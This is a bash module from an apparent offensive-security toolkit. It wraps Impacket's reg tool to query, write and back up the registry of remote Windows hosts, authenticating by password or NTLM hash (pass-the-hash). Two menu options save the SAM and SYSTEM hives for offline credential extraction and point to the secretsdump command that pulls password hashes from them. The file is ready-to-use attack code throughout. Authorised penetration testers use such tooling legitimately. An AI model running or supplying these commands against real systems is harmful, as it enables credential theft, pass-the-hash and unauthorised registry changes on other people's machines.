#!/bin/bash
#
# Impacket Registry Module
# Contains Windows registry operations
#
# This module provides functions for interacting with the Windows registry
# remotely using Impacket's reg tool. Capabilities include:
#   - Querying registry keys and values
#   - Reading specific registry values
#   - Writing registry values
#   - Backing up registry hives
#   - Saving SAM and SYSTEM hives for offline credential extraction
#

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Note: This module expects the following global variables to be set:
# - DOMAIN: Domain name
# - USERNAME: Username for authentication
# - PASSWORD: Password for authentication
# - HASH: NTLM hash for pass-the-hash
# - TARGET: Target IP or hostname
#
# And these functions to be available:
# - get_target_for_command(): Gets target(s) based on run mode
# - show_menu(): Displays menu using fzf
# - run_command(): Executes command with preview and confirmation

# Handle Windows registry operations
handle_registry() {
    target=$(get_target_for_command) || return
    subchoice=$(show_menu "impacket_registry" "Select Registry Operation: ")

    if [[ -n "$HASH" ]]; then
        impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
    else
        impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
    fi

    case "$subchoice" in
        "Query Registry Key")
            read -p "Registry key path (e.g., HKLM\\SOFTWARE\\Microsoft): " key
            run_command "impacket-reg $impacket_auth query -keyName '$key'"
            ;;
        "Read Registry Value")
            read -p "Registry key path: " key
            read -p "Value name: " value
            run_command "impacket-reg $impacket_auth query -keyName '$key' -v '$value'"
            ;;
        "Write Registry Value")
            read -p "Registry key path: " key
            read -p "Value name: " value
            read -p "Value type (REG_SZ, REG_DWORD, etc.): " type
            read -p "Value data: " data
            run_command "impacket-reg $impacket_auth add -keyName '$key' -v '$value' -vt '$type' -vd '$data'"
            ;;
        "Backup Registry Hive")
            read -p "Hive name (e.g., HKLM): " hive
            read -p "Output file: " outfile
            run_command "impacket-reg $impacket_auth backup -keyName '$hive' '$outfile'"
            ;;
        "Save SAM Hive")
            echo -e "${CYAN}Saving SAM hive for offline analysis${NC}"
            run_command "impacket-reg $impacket_auth save -keyName HKLM\\SAM sam.save"
            echo -e "\n${GREEN}SAM hive saved to sam.save${NC}"
            read -p "Press Enter to continue..."
            ;;
        "Save SYSTEM Hive")
            echo -e "${CYAN}Saving SYSTEM hive for offline analysis${NC}"
            run_command "impacket-reg $impacket_auth save -keyName HKLM\\SYSTEM system.save"
            echo -e "\n${GREEN}SYSTEM hive saved to system.save${NC}"
            echo -e "${YELLOW}Use with: impacket-secretsdump -sam sam.save -system system.save LOCAL${NC}"
            read -p "Press Enter to continue..."
            ;;
    esac
}
